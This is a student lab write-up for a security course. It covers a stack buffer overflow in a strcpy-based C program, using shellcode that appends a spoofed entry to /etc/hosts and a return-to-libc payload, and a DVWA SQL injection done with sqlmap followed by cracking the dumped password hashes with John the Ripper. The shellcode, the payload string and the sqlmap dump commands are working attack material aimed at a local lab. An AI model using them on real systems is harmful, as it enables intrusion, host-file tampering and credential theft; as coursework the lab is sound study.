# Lab #1,22110079, Van Cong Toan, INSE330380E_02FIE

# Task 1: Software buffer overflow attack

Given a vulnerable C program

```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```

and a shellcode in asm. This shellcode add a new entry in hosts file

```
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80            ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20             ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80            ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax
    int 0x80            ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"

```

**Question 1**:

- Compile asm program and C program to executable code.
- Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is added to the /etc/hosts file on your linux.
  You are free to choose Code Injection or Environment Variable approach to do.
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.

**Answer 1**: Must conform to below structure:

- I will use a Docker container for this lab, and it will be mapped to my `seclabs` directory.
  ![image](https://github.com/user-attachments/assets/c64c27b7-0e6c-45bf-96b7-b0406fb1124e)
- After that, I will compile the `C assembly` program and the `C` program into executable code.
  ![image](https://github.com/user-attachments/assets/891e8cf2-0b0a-4c7e-b893-f9eeb0c93ad8)
- I will use an older version of bash and disable the random assignment of stack values.
  ![image](https://github.com/user-attachments/assets/3eddd851-b579-40a1-a60d-b969be28f163)
- The pwd of the sellcode
  ![image](https://github.com/user-attachments/assets/db1a17ba-f7b3-4607-a23a-053f21ae2b49)
- Create an environment variable named `my_path` and assign it the value of the path to the file `shellcode`
  ![image](https://github.com/user-attachments/assets/e0479b5b-ecd9-4378-acbf-6c46b51fcf25)
- Stack Frame
  ![image](https://github.com/user-attachments/assets/a1093eb6-8d6f-4720-8cdb-7e26e8afb2c4)
- I will locate the addresses of the `system` and `exit` functions, along with the string of the variable.
  ![image](https://github.com/user-attachments/assets/ab0060d8-395e-44cf-9bbe-37d3e912becd)
- Address value of system: `0xf7e50db0` will be inserted with format \xb0\x0d\xe5\xf7
- Address value of exit: `0xf7e449e0` will be inserted with format \xe0\x49\xe4\f7
- Address value of the string of env: `0xffffded7` will be inserted with format `\xd7\xde\xff\xff`
  **So the command will be :**

```python
 r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' '\xe0\x49\xe4\xf7' +  '\xd7\xde\xff\xff')")
```

![image](https://github.com/user-attachments/assets/a0566091-280b-4c30-830d-77a285eb5a48)

- Before Attack
  ![image](https://github.com/user-attachments/assets/d5b303bc-cf0e-4e9b-9183-ce27d5bd2398)

- After Attack
  ![image](https://github.com/user-attachments/assets/b1f4aa94-78b9-489d-8aa5-da66207425c7)

**Conclusion:** The buffer overflow vulnerability in the C program was effectively exploited through shellcode injection and return-to-libc techniques.

---

# Task 2: Attack on the database of Vulnerable App from SQLi lab

- Start docker container from SQLi.
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup.

---

- Install dvwa
  ![image](https://github.com/user-attachments/assets/ceac24d5-59a5-4ca9-99ec-64f2b406be4b)
- Instal `sqlmap`
  ![image](https://github.com/user-attachments/assets/2e09dd4a-a4ed-4dbe-b248-b825c2e17ccf)
  ![image](https://github.com/user-attachments/assets/4371610e-9db7-42aa-89b2-b0adf73b18d7)
- To carry out this lab, we will set the DVWA security level to low.
  ![image](https://github.com/user-attachments/assets/4755229e-bf66-48a8-aa7f-cd683861fe8c)
- The cookie of web
  ![image](https://github.com/user-attachments/assets/cfcfcbc3-d230-45e1-8dfd-4fce7f2874d4)

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

- run `python3 sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=kdmmsrmp3voj7k0alb3e9bfgb6; security=low" --dbs` to get information about all available databases
  ![image](https://github.com/user-attachments/assets/c4e70c7c-f56d-4a4e-9abd-e4438a200511)

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:

- run `python3 sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=kdmmsrmp3voj7k0alb3e9bfgb6; security=low" -D dvwa --tables` to get tables
  ![image](https://github.com/user-attachments/assets/75210d1b-b5b1-4bd0-95f4-1978d55055dc)

-run `python3 sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=kdmmsrmp3voj7k0alb3e9bfgb6; security=low" -D dvwa -T users --dump` to get users information
![image](https://github.com/user-attachments/assets/da9fe137-2be8-47d4-a879-ab88f84c4fd5)

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:

- Install John the Ripper
  ![image](https://github.com/user-attachments/assets/ba36564c-6d50-48f0-a522-090489a89bd0)
- Save encrypted passwords to hashes.txt file
  ![image](https://github.com/user-attachments/assets/42b7257d-4b8b-42f5-bf90-2a2680f7bacc)
  ![image](https://github.com/user-attachments/assets/916366ac-440a-4f83-a4c0-c502311c67e9)
- Perform code translation
  ![image](https://github.com/user-attachments/assets/bb733ea9-4a5c-436e-a98c-da2fc22a1851)
